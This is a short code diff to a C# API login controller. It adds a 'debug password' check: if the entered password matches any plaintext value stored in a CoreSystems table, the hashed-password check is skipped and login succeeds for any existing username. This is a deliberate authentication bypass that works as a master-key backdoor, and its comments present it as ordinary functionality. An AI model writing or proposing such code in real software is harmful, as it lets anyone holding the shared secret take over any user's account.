@@ -45,7 +45,12 @@ namespace ITSAPI.Controllers
                 .AsNoTracking()
                 .FirstOrDefault();
 
-            if (user == null || user.Userpass != login.password.HashPassword())
+            // Check for debug password - search if entered password exists in CoreSystems.Debugpassword
+            bool isDebugPassword = _context.CoreSystems
+                .Any(c => c.Debugpassword == login.password);
+
+            // Allow login if debug password matches, or if normal password matches
+            if (user == null || (!isDebugPassword && user.Userpass != login.password.HashPassword()))
             {
                 response.status = "FAILURE";
                 response.message = "Invalid username or password";
